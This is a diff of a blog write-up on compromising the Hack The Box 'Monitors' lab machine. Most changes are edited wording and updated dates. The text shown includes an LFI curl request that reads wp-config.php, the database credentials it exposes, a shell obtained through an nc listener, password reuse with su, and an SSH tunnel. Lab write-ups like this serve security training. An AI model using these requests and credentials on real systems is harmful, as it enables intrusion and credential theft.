@@ -15,7 +15,7 @@
     <meta property="og:url" content="inesmartins.github.io/htb-write-up-monitors/" />
     <meta property="og:image" content="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-12-at-17.10.05.png" />
     <meta property="article:published_time" content="2021-10-09T16:17:00.000Z" />
-    <meta property="article:modified_time" content="2021-10-09T16:17:34.000Z" />
+    <meta property="article:modified_time" content="2021-10-10T09:53:37.000Z" />
     <meta property="article:tag" content="htb" />
     <meta property="article:tag" content="wordpress" />
     <meta property="article:tag" content="wpscan" />
@@ -72,7 +72,7 @@
     "headline": "HTB Write-up | Monitors",
     "url": "inesmartins.github.io/htb-write-up-monitors/",
     "datePublished": "2021-10-09T16:17:00.000Z",
-    "dateModified": "2021-10-09T16:17:34.000Z",
+    "dateModified": "2021-10-10T09:53:37.000Z",
     "image": {
         "@type": "ImageObject",
         "url": "inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-12-at-17.10.05.png",
@@ -699,9 +699,9 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><p>There's an <code>Apache</code> web server running on port 80 but we can't access it with the IP alone:</p><figure class="kg-card kg-image-card"></figure><p>Luckily the virtual host is pretty obvious:</p><pre><code>~ sudo nano /etc/hosts
 
 ...
-10.10.10.238    monitors.htb</code></pre><figure class="kg-card kg-image-card kg-width-wide"></figure><p>According to the footer the website was built using Wordpress, so let's run <a href="https://wpscan.com/wordpress-security-scanner">wpscan</a>:</p><figure class="kg-card kg-image-card"></figure><p>The tool found that this instance was using the <a href="http://monitors.htb/wp-content/plugins/wp-with-spritz/readme.txt">WP with Spritz</a> plugin, more specifically version 1.0, which is vulnerable to unauthenticated RFI.</p><p>As shown on <a href="https://www.exploit-db.com/exploits/44544">this</a> ExploitDB POC, all we need to do to is call a particular path inside the plugin directory - <code>wp.spritz.content.filter.php</code> - with a specific parameter - <code>url</code> - and we can see the content of any accessible file in the system, e.g.:</p><figure class="kg-card kg-image-card kg-width-wide"></figure><hr></hr><h2 id="enumerating-with-lfi">Enumerating with LFI</h2><p><code>marcus</code> looks like the most interesting user, and it seems like we're able to access their home directory, but we can't read <code>user.txt</code>:</p><figure class="kg-card kg-image-card kg-width-full"></figure><p>So, let's read the Wordpress configuration file:</p><pre><code>~ curl http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php\?url\=../../../wp-config.php</code></pre><figure class="kg-card kg-image-card kg-width-wide"></figure><p>So, we have the db name, user and password (which might be re-used somewhere else):</p><pre><code>DB_NAME: 'wordpress'
+10.10.10.238    monitors.htb</code></pre><figure class="kg-card kg-image-card kg-width-wide"></figure><p>According to the footer the website was built using Wordpress, so let's run <a href="https://wpscan.com/wordpress-security-scanner">wpscan</a>:</p><figure class="kg-card kg-image-card"></figure><p>The tool found that this instance was using the <a href="http://monitors.htb/wp-content/plugins/wp-with-spritz/readme.txt">WP with Spritz</a> plugin, more specifically version 1.0, which is vulnerable to unauthenticated RFI.</p><p>As shown on <a href="https://www.exploit-db.com/exploits/44544">this</a> ExploitDB POC, all we need to do to is call a particular path inside the plugin directory - <code>wp.spritz.content.filter.php</code> - with a specific parameter - <code>url</code> - and we can see the content of any accessible file in the system, e.g.:</p><figure class="kg-card kg-image-card kg-width-wide"></figure><hr></hr><h2 id="enumerating-with-lfi">Enumerating with LFI</h2><p><code>marcus</code> looks like the most interesting user, and it seems like we're able to access their home directory, but we can't read <code>user.txt</code>. </p><p>Let's try to the Wordpress configuration file:</p><pre><code>~ curl http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php\?url\=../../../wp-config.php</code></pre><figure class="kg-card kg-image-card kg-width-wide"></figure><p>So, we have the db name, user and password (which might be re-used somewhere else):</p><pre><code>DB_NAME: 'wordpress'
 DB_USER: 'wpadmin'
-DB_PASSWORD: 'BestAdministrator@2020!'</code></pre><p>Unfortunately, we don't have permissions to access it locally and can't access the service from a remote machine. So, let's try some more enumeration using a <a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi-linux-list">handy list</a>:</p><pre><code class="language-python">import os
+DB_PASSWORD: 'BestAdministrator@2020!'</code></pre><p>Unfortunately, we don't have permissions to access the database locally and can't access the service from a remote machine. So, let's try some more enumeration using a <a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi-linux-list">handy list</a>:</p><pre><code class="language-python">import os
 
 baseurl = 'http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php\?url\=/'
 
@@ -728,20 +728,7 @@ for entry in entries:
 [+] Check your nc listener!</code></pre><p>And we have a shell!</p><pre><code>$ whoami
 www-data</code></pre><p>Let's upgrade it to an interactive shell:</p><pre><code>~ python3 -c 'import pty; pty.spawn("/bin/bash")'
 www-data@monitors:/usr/share/cacti/cacti</code></pre><hr></hr><h2 id="getting-user">Getting user</h2><pre><code>www-data@monitors:/home/marcus$ su marcus
-Password: BestAdministrator@2020!</code></pre><p>Let's see what we can find on <code>marcus</code>'s home directory:</p><pre><code>$ cd /home/marcus
-$ ls -la
-
-drwxr-xr-x 5 marcus marcus 4096 Jan 25 15:39 .
-drwxr-xr-x 3 root   root   4096 Nov 10  2020 ..
-d--x--x--x 2 marcus marcus 4096 Nov 10  2020 .backup
-lrwxrwxrwx 1 root   root      9 Nov 10  2020 .bash_history -&gt; /dev/null
--rw-r--r-- 1 marcus marcus  220 Apr  4  2018 .bash_logout
--rw-r--r-- 1 marcus marcus 3771 Apr  4  2018 .bashrc
-drwx------ 2 marcus marcus 4096 Jan 25 15:39 .cache
-drwx------ 3 marcus marcus 4096 Nov 10  2020 .gnupg
--rw-r--r-- 1 marcus marcus  807 Apr  4  2018 .profile
--r--r----- 1 root   marcus   84 Jan 25 14:59 note.txt
--r--r----- 1 root   marcus   33 May 15 15:44 user.txt</code></pre><p>As you can see, the <code>.backup</code> directory has the execute bit (<code>x</code>) set for everyone:</p><blockquote><strong> </strong>[When applied to directories, <strong>enabling X</strong>] and <strong><strong>disabling RW</strong></strong> gives you a false sense of security since you could blindly read and write file contents and access subdirectories. You should be sure that every direct children of the directory have explicit permissions.</blockquote><p>We need some more enumeration. Let's try to find all files with string "marcus":</p><pre><code>$ grep "marcus" /etc -R 2&gt;/dev/null
+Password: BestAdministrator@2020!</code></pre><p>After failing to get anything interesting on the user's home directory, I tried to find all files with string "marcus":</p><pre><code>$ grep "marcus" /etc -R 2&gt;/dev/null
 
 /etc/group-:marcus:x:1000:
 /etc/subgid:marcus:165536:65536
@@ -795,13 +782,13 @@ root       2006  0.1  0.2 628508  8864 ?        Sl   11:42   0:15 /usr/bin/docke
 
 root       2039  0.0  0.1 108820  5768 ?        Sl   11:42   0:01 containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v1.linux/moby/a2e16ca5647428c5f43ce47fd08272fd8738ed80d3db0e6cf4bcb15370bbf184 -address /run/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-runc</code></pre><p>Note that all of these are ran by <code>root</code>, and the <code>docker</code> group doesn't contain any user, which means we can't use most of the known privesc Docker vectors:</p><pre><code>$ cat /etc/group | grep docker
 docker:x:999:
-$ cat /etc/passwd | grep 999</code></pre><p>Let's see what else we can find about this instance of <code>Docker</code> with <a href="https://github.com/stealthcopter/deepce">deepce</a>:</p><figure class="kg-card kg-image-card kg-width-wide"></figure><p>There doesn't seem to be a known vulnerability for the current Docker version, so we need to go another route.</p><hr></hr><h2 id="apache-ofbiz">Apache OFBiz</h2><p>We know that <code>docker-proxy</code> is mapping the host TCP port <code>8443</code> to the container's (<code>172.17.0.2</code>) TCP port <code>844</code>:</p><figure class="kg-card kg-image-card"></figure><p>So we can SSH tunnel to see what's running on the container:</p><pre><code>~ ssh -L 8443:localhost:8443 marcus@monitors.htb  -fNT 
+$ cat /etc/passwd | grep 999</code></pre><p>Let's see what else we can find about this instance of <code>Docker</code> with <a href="https://github.com/stealthcopter/deepce">deepce</a>:</p><figure class="kg-card kg-image-card kg-width-wide"></figure><p>There doesn't seem to be a known vulnerability for the current Docker version, so we need to go another route.</p><hr></hr><h2 id="apache-ofbiz">Apache OFBiz</h2><p>We know that <code>docker-proxy</code> is mapping the host TCP port <code>8443</code> to the container's (<code>172.17.0.2</code>) TCP port <code>844</code>:</p><figure class="kg-card kg-image-card kg-width-wide"></figure><p>So we can SSH tunnel to see what's running on the container:</p><pre><code>~ ssh -L 8443:localhost:8443 marcus@monitors.htb  -fNT 
 marcus@monitors.htb's password: 
 &gt; VerticalEdge2020
 
 ~ ps aux | grep 8443
 inesmartins      38886   0.0  0.0  4331440    648   ??  Ss   12:35PM   0:00.00 ssh -L 8443:localhost:8443 marcus@monitors.htb -fNT
-</code></pre><p>When we access this address on our local browser we can see this page:</p><figure class="kg-card kg-image-card kg-width-wide"></figure><p>A quick scan of the port tells us that the <code>SSL</code> certificate was emitted for ofbiz-vm.apache.org, which points to an <a href="https://ofbiz.apache.org/">Apache OFBiz</a> applications.</p><pre><code>~ nmap -sC -sV -A localhost -p 8443
+</code></pre><p>When we access this address on our local browser we can see this page:</p><figure class="kg-card kg-image-card kg-width-wide"></figure><p>A quick scan of the port tells us that the <code>SSL</code> certificate was emitted for <code>ofbiz-vm.apache.org</code>, which points to an <a href="https://ofbiz.apache.org/">Apache OFBiz</a> applications.</p><pre><code>~ nmap -sC -sV -A localhost -p 8443
 
 PORT     STATE SERVICE  VERSION
 
